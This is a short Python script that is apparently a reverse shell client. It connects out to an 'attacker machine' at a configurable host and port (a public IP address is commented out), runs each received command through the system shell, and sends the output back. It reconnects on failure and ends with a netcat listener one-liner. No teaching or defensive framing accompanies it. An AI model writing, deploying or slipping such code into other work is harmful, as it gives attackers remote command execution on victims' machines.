import socket,subprocess
#HOST = '91.229.76.199' #the remote host
HOST = '127.0.0.1' #the remote host
PORT = 2469 #the same port as used by the server
s=""
def doconnect():
    global HOST
    global PORT
    global s
    s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT)) #connect to attacker machine

def receivedata():
    global s
    while 1:
        data = s.recv(1024) #receive shell command
        if data == "quit":
            break #if it quit then break and close socket
        #do shell command
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin =subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read() #read output
        s.send(stdout_value) #send ouput to attacker

def doall():
    try:
        doconnect()
    except:
        doall()
    try:
        receivedata()
    except:
        doconnect()
        doall()
doall()
s.close() #close socket
#listen with netcat: while true; do nc -l -p 2468; done
